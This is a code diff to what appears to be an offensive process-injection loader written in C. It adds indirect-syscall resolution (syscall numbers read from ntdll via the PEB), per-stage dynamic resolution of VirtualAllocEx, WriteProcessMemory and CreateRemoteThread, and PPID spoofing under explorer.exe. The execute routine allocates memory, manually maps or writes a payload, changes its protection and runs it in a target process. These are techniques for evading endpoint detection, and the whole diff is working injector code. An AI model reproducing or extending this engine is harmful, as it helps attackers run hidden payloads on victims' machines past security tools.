@@ -8,13 +8,6 @@
 
 static LOCAL_LOADER_CONTEXT g_EnvContext = { 0 };
 
-/*// DFR function pointers (kernel32)
-static P_VirtualAllocEx      g_VirtualAllocEx      = NULL;
-static P_VirtualProtectEx    g_VirtualProtectEx    = NULL;
-static P_WriteProcessMemory  g_WriteProcessMemory  = NULL;
-static P_CreateRemoteThread  g_CreateRemoteThread  = NULL;
-static P_WaitForSingleObject g_WaitForSingleObject = NULL;*/
-
 P_VirtualAllocEx      g_VirtualAllocEx      = NULL;
 P_VirtualProtect      g_VirtualProtect      = NULL;
 P_VirtualProtectEx    g_VirtualProtectEx    = NULL;
@@ -30,6 +23,7 @@ DWORD    wNtCreateThreadExSSN             = 0;
 DWORD    wNtWaitForSingleObjectSSN        = 0;
 DWORD    wNtQueueApcThreadSSN             = 0;
 DWORD    wNtResumeThreadSSN               = 0;
+DWORD    wNtQueryVirtualMemorySSN         = 0;
 
 // function addresses
 UINT_PTR sysAddrNtAllocateVirtualMemory   = 0;
@@ -39,6 +33,7 @@ UINT_PTR sysAddrNtCreateThreadEx          = 0;
 UINT_PTR sysAddrNtWaitForSingleObject     = 0;
 UINT_PTR sysAddrNtQueueApcThread          = 0;
 UINT_PTR sysAddrNtResumeThread            = 0;
+UINT_PTR sysAddrNtQueryVirtualMemory      = 0;
 
 #ifdef _WIN64
 #define RELOC_TYPE IMAGE_REL_BASED_DIR64
@@ -222,20 +217,30 @@ BOOL ManualMapWrite(PINJECTION_CONTEXT ctx, LPCVOID pPayload)
     return TRUE;
 }
 
+/*
 BOOL InitializeResolvers(PINJECTION_CONTEXT ctx)
 {
     BOOL needDFR      = FALSE;
     BOOL needIndirect = FALSE;
 
+    printf("[DEBUG] ctx->allocFlavor: %d\n", ctx->allocFlavor);
+    printf("[DEBUG] ctx->writeFlavor: %d\n", ctx->writeFlavor);
+    printf("[DEBUG] ctx->protectFlavor: %d\n", ctx->protectFlavor);
+    printf("[DEBUG] ctx->invokeFlavor: %d\n", ctx->invokeFlavor);
+
     //
     // Determine which resolver types are needed based on per-stage flavors
     //
+
     if (ctx->allocFlavor   == FLAVOR_DFR ||
         ctx->writeFlavor   == FLAVOR_DFR ||
         ctx->protectFlavor == FLAVOR_DFR ||
         ctx->invokeFlavor  == FLAVOR_DFR)
     {
         needDFR = TRUE;
+        printf("[DEBUG] DFR is required.\n");
+    } else {
+        printf("[DEBUG] DFR is NOT required.\n");
     }
 
     if (ctx->allocFlavor   == FLAVOR_INDIRECT ||
@@ -243,7 +248,10 @@ BOOL InitializeResolvers(PINJECTION_CONTEXT ctx)
         ctx->protectFlavor == FLAVOR_INDIRECT ||
         ctx->invokeFlavor  == FLAVOR_INDIRECT)
     {
+        printf("[DEBUG] Indirect Resolution is required.\n");
         needIndirect = TRUE;
+    } else {
+        printf("[DEBUG] Indirect Resolution is NOT required.\n");
     }
 
     //
@@ -277,11 +285,17 @@ BOOL InitializeResolvers(PINJECTION_CONTEXT ctx)
             !g_VirtualProtect || !g_VirtualProtectEx || 
             !g_CreateRemoteThread || !g_WaitForSingleObject)
         {
-            printf("[ERROR] DFR resolver failed.\n");
+            printf("[ERROR] DFR resolver failed entirely.\n");
             return FALSE;
         }
 
-        printf("[+] DFR resolver initialized.\n");
+        printf("[+] DFR pointers:\n");
+        printf("  VirtualAllocEx      = %p\n", g_VirtualAllocEx);
+        printf("  WriteProcessMemory  = %p\n", g_WriteProcessMemory);
+        printf("  VirtualProtect      = %p\n", g_VirtualProtect);
+        printf("  VirtualProtectEx    = %p\n", g_VirtualProtectEx);
+        printf("  CreateRemoteThread  = %p\n", g_CreateRemoteThread);
+        printf("  WaitForSingleObject = %p\n", g_WaitForSingleObject);
     }
 
     //
@@ -310,12 +324,9 @@ BOOL InitializeResolvers(PINJECTION_CONTEXT ctx)
             return FALSE;
         }
 
-        g_EnvContext.sysAddrNtAllocateVirtualMemory =
-            (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtAllocateVirtualMemory"));
-        g_EnvContext.sysAddrNtProtectVirtualMemory =
-            (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtProtectVirtualMemory"));
-        g_EnvContext.sysAddrNtWriteVirtualMemory =
-            (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtWriteVirtualMemory"));
+        g_EnvContext.sysAddrNtAllocateVirtualMemory = (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtAllocateVirtualMemory"));
+        g_EnvContext.sysAddrNtProtectVirtualMemory = (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtProtectVirtualMemory"));
+        g_EnvContext.sysAddrNtWriteVirtualMemory = (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtWriteVirtualMemory"));
 
         // Bridge values into globals used by indirect-syscalls.asm
         wNtAllocateVirtualMemorySSN    = g_EnvContext.wNtAllocateVirtualMemorySSN;
@@ -331,21 +342,257 @@ BOOL InitializeResolvers(PINJECTION_CONTEXT ctx)
         wNtWaitForSingleObjectSSN      = GetSSNByName(pPeb, "NtWaitForSingleObject");
         wNtQueueApcThreadSSN           = GetSSNByName(pPeb, "NtQueueApcThread");
         wNtResumeThreadSSN             = GetSSNByName(pPeb, "NtResumeThread");
+        wNtQueryVirtualMemorySSN       = GetSSNByName(pPeb, "NtQueryVirtualMemory");
 
         sysAddrNtCreateThreadEx        = (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtCreateThreadEx"));
         sysAddrNtWaitForSingleObject   = (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtWaitForSingleObject"));
         sysAddrNtQueueApcThread        = (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtQueueApcThread"));
         sysAddrNtResumeThread          = (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtResumeThread"));
+        sysAddrNtQueryVirtualMemory    = (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtQueryVirtualMemory"));
 
         printf("[+] Indirect resolver initialized.\n");
-        printf("[+] SSNs Loaded: NtAllocateVirtualMemory(0x%X), NtWriteVirtualMemory(0x%X), NtProtectVirtualMemory(0x%X), NtCreateThreadEx(0x%X), NtWaitForSingleObject(0x%X)\n",
-            wNtAllocateVirtualMemorySSN, wNtWriteVirtualMemorySSN, wNtProtectVirtualMemorySSN, wNtCreateThreadExSSN, wNtWaitForSingleObjectSSN);        
+        printf("[+] SSNs Loaded: NtAllocateVirtualMemory(0x%X), NtWriteVirtualMemory(0x%X), NtProtectVirtualMemory(0x%X), NtCreateThreadEx(0x%X), NtWaitForSingleObject(0x%X), NtQueryVirtualMemory(0x%X)\n",
+            wNtAllocateVirtualMemorySSN, wNtWriteVirtualMemorySSN, wNtProtectVirtualMemorySSN, wNtCreateThreadExSSN, wNtWaitForSingleObjectSSN, wNtQueryVirtualMemorySSN);        
+    }
+
+    return TRUE;
+}*/
+
+BOOL InitializeResolvers(PINJECTION_CONTEXT ctx)
+{
+    //
+    // Debug: show per-stage flavors
+    //
+    printf("[DEBUG] ctx->allocFlavor: %d\n",   ctx->allocFlavor);
+    printf("[DEBUG] ctx->writeFlavor: %d\n",   ctx->writeFlavor);
+    printf("[DEBUG] ctx->protectFlavor: %d\n", ctx->protectFlavor);
+    printf("[DEBUG] ctx->invokeFlavor: %d\n",  ctx->invokeFlavor);
+
+    //
+    // Per-stage DFR needs
+    //
+    BOOL needDFRAlloc   = (ctx->allocFlavor   == FLAVOR_DFR);
+    BOOL needDFRWrite   = (ctx->writeFlavor   == FLAVOR_DFR);
+    BOOL needDFRProtect = (ctx->protectFlavor == FLAVOR_DFR);
+    BOOL needDFRInvoke  = (ctx->invokeFlavor  == FLAVOR_DFR);
+
+    BOOL needDFR = needDFRAlloc || needDFRWrite || needDFRProtect || needDFRInvoke;
+
+    if (needDFR)
+        printf("[DEBUG] DFR is required.\n");
+    else
+        printf("[DEBUG] DFR is NOT required.\n");
+
+    //
+    // Per-stage Indirect needs
+    //
+    BOOL needIndirectAlloc   = (ctx->allocFlavor   == FLAVOR_INDIRECT);
+    BOOL needIndirectWrite   = (ctx->writeFlavor   == FLAVOR_INDIRECT);
+    BOOL needIndirectProtect = (ctx->protectFlavor == FLAVOR_INDIRECT);
+    BOOL needIndirectInvoke  = (ctx->invokeFlavor  == FLAVOR_INDIRECT);
+
+    BOOL needIndirect = needIndirectAlloc || needIndirectWrite || needIndirectProtect || needIndirectInvoke;
+
+    if (needIndirect)
+        printf("[DEBUG] Indirect Resolution is required.\n");
+    else
+        printf("[DEBUG] Indirect Resolution is NOT required.\n");
+
+    //
+    // Initialize DFR resolver (kernel32 exports) — only what’s needed
+    //
+    if (needDFR)
+    {
+        printf("[*] Initializing DFR resolver...\n");
+
+        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+        if (!hKernel32)
+        {
+            printf("[ERROR] Failed to get kernel32.dll\n");
+            return FALSE;
+        }
+
+        if (needDFRAlloc)
+        {
+            g_VirtualAllocEx =
+                (P_VirtualAllocEx)GPAManualByName(hKernel32, "VirtualAllocEx");
+            if (!g_VirtualAllocEx)
+            {
+                printf("[ERROR] Failed to resolve VirtualAllocEx for DFR alloc.\n");
+                return FALSE;
+            }
+        }
+
+        if (needDFRWrite)
+        {
+            g_WriteProcessMemory =
+                (P_WriteProcessMemory)GPAManualByName(hKernel32, "WriteProcessMemory");
+            if (!g_WriteProcessMemory)
+            {
+                printf("[ERROR] Failed to resolve WriteProcessMemory for DFR write.\n");
+                return FALSE;
+            }
+        }
+
+        if (needDFRProtect)
+        {
+            g_VirtualProtect =
+                (P_VirtualProtect)GPAManualByName(hKernel32, "VirtualProtect");
+            g_VirtualProtectEx =
+                (P_VirtualProtectEx)GPAManualByName(hKernel32, "VirtualProtectEx");
+
+            if (!g_VirtualProtect || !g_VirtualProtectEx)
+            {
+                printf("[ERROR] Failed to resolve VirtualProtect/VirtualProtectEx for DFR protect.\n");
+                return FALSE;
+            }
+        }
+
+        if (needDFRInvoke)
+        {
+            g_CreateRemoteThread =
+                (P_CreateRemoteThread)GPAManualByName(hKernel32, "CreateRemoteThread");
+            g_WaitForSingleObject =
+                (P_WaitForSingleObject)GPAManualByName(hKernel32, "WaitForSingleObject");
+
+            if (!g_CreateRemoteThread || !g_WaitForSingleObject)
+            {
+                printf("[ERROR] Failed to resolve CreateRemoteThread/WaitForSingleObject for DFR invoke.\n");
+                return FALSE;
+            }
+        }
+
+        printf("[+] DFR resolver initialized.\n");
+        if (needDFRAlloc)
+            printf("  VirtualAllocEx      = %p\n", g_VirtualAllocEx);
+        if (needDFRWrite)
+            printf("  WriteProcessMemory  = %p\n", g_WriteProcessMemory);
+        if (needDFRProtect)
+        {
+            printf("  VirtualProtect      = %p\n", g_VirtualProtect);
+            printf("  VirtualProtectEx    = %p\n", g_VirtualProtectEx);
+        }
+        if (needDFRInvoke)
+        {
+            printf("  CreateRemoteThread  = %p\n", g_CreateRemoteThread);
+            printf("  WaitForSingleObject = %p\n", g_WaitForSingleObject);
+        }
+    }
+
+    //
+    // Initialize Indirect resolver (SSNs + syscall addresses) — only what’s needed
+    //
+    if (needIndirect)
+    {
+        printf("[*] Initializing Indirect resolver...\n");
+
+#if defined(_WIN64)
+        PPEB pPeb = (PPEB)__readgsqword(0x60);
+#else
+        PPEB pPeb = (PPEB)__readfsdword(0x30);
+#endif
+
+        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+        if (!hNtdll)
+        {
+            printf("[ERROR] Failed to resolve ntdll.dll\n");
+            return FALSE;
+        }
+
+        //
+        // Alloc: NtAllocateVirtualMemory
+        //
+        if (needIndirectAlloc)
+        {
+            g_EnvContext.wNtAllocateVirtualMemorySSN =
+                GetSSNByName(pPeb, "NtAllocateVirtualMemory");
+            g_EnvContext.sysAddrNtAllocateVirtualMemory =
+                (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtAllocateVirtualMemory"));
+
+            wNtAllocateVirtualMemorySSN    = g_EnvContext.wNtAllocateVirtualMemorySSN;
+            sysAddrNtAllocateVirtualMemory = g_EnvContext.sysAddrNtAllocateVirtualMemory;
+        }
+
+        //
+        // Write: NtWriteVirtualMemory
+        //
+        if (needIndirectWrite)
+        {
+            g_EnvContext.wNtWriteVirtualMemorySSN =
+                GetSSNByName(pPeb, "NtWriteVirtualMemory");
+            g_EnvContext.sysAddrNtWriteVirtualMemory =
+                (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtWriteVirtualMemory"));
+
+            wNtWriteVirtualMemorySSN    = g_EnvContext.wNtWriteVirtualMemorySSN;
+            sysAddrNtWriteVirtualMemory = g_EnvContext.sysAddrNtWriteVirtualMemory;
+        }
+
+        //
+        // Protect: NtProtectVirtualMemory
+        //
+        if (needIndirectProtect)
+        {
+            g_EnvContext.wNtProtectVirtualMemorySSN =
+                GetSSNByName(pPeb, "NtProtectVirtualMemory");
+            g_EnvContext.sysAddrNtProtectVirtualMemory =
+                (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtProtectVirtualMemory"));
+
+            wNtProtectVirtualMemorySSN    = g_EnvContext.wNtProtectVirtualMemorySSN;
+            sysAddrNtProtectVirtualMemory = g_EnvContext.sysAddrNtProtectVirtualMemory;
+        }
+
+        //
+        // Invoke: NtCreateThreadEx, NtWaitForSingleObject
+        //
+        if (needIndirectInvoke)
+        {
+            wNtCreateThreadExSSN      = GetSSNByName(pPeb, "NtCreateThreadEx");
+            wNtWaitForSingleObjectSSN = GetSSNByName(pPeb, "NtWaitForSingleObject");
+
+            sysAddrNtCreateThreadEx      =
+                (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtCreateThreadEx"));
+            sysAddrNtWaitForSingleObject =
+                (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtWaitForSingleObject"));
+        }
+
+        //
+        // Optional: NtQueryVirtualMemory if any stage uses it (e.g., write/protect heuristics)
+        //
+        // If you only use NtQueryVirtualMemory in indirect write/protect, you can gate it:
+        BOOL needQueryVM = needIndirectWrite || needIndirectProtect;
+        if (needQueryVM)
+        {
+            wNtQueryVirtualMemorySSN   = GetSSNByName(pPeb, "NtQueryVirtualMemory");
+            sysAddrNtQueryVirtualMemory =
+                (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtQueryVirtualMemory"));
+        }
+
+        printf("[+] Indirect resolver initialized.\n");
+        printf("[+] SSNs Loaded:\n");
+        if (needIndirectAlloc)
+            printf("  NtAllocateVirtualMemory(0x%X)\n", wNtAllocateVirtualMemorySSN);
+        if (needIndirectWrite)
+            printf("  NtWriteVirtualMemory(0x%X)\n",    wNtWriteVirtualMemorySSN);
+        if (needIndirectProtect)
+            printf("  NtProtectVirtualMemory(0x%X)\n",  wNtProtectVirtualMemorySSN);
+        if (needIndirectInvoke)
+        {
+            printf("  NtCreateThreadEx(0x%X)\n",        wNtCreateThreadExSSN);
+            printf("  NtWaitForSingleObject(0x%X)\n",   wNtWaitForSingleObjectSSN);
+        }
+        if (needQueryVM)
+            printf("  NtQueryVirtualMemory(0x%X)\n",    wNtQueryVirtualMemorySSN);
     }
 
     return TRUE;
 }
 
+//
+// todo: consider where to place arg parsing logic to determine if the user provided a spawnPath AND target PID
+//
 BOOL InitializeTarget(PINJECTION_CONTEXT ctx, SYSCALL_FLAVOR flavor) {
+    // if we have a spawnPath defined, we want to run it with PPID spoofing
+    // by default, explorer.exe will be used as the PPID (variable: parentPid)
     if (ctx->spawnPath) {
 #ifndef REFLECTIVE_PAYLOAD
         STARTUPINFOEXA si = { sizeof(si) };
@@ -431,18 +678,26 @@ BOOL EngineExecute(PINJECTION_ENGINE engine,
                    LPCVOID pPayload,
                    DWORD finalProtect)
 {
+    printf("[+] Initializing target.\n");
     InitializeTarget(ctx, ctx->allocFlavor);
+    printf("[+] Initializing resolvers.\n");
     InitializeResolvers(ctx);
 
+    printf("[+] Running allocation.\n");
     engine->Allocate(ctx, PAGE_READWRITE);
 
-    if (IsPayloadPE(pPayload))
+    if (IsPayloadPE(pPayload)) {
+        printf("[+] Writing payload with ManualMapWrite.\n");
         ManualMapWrite(ctx, pPayload);
-    else
+    } else {
+        printf("[+] Writing payload.\n");
         engine->Write(ctx, pPayload);
+    }
 
+    printf("[+] Adjusting permissions.\n");
     DWORD oldProt = 0;
     engine->Protect(ctx, finalProtect, &oldProt);
 
+    printf("[+] Invoking payload.\n");
     return engine->Invoke(ctx);
 }
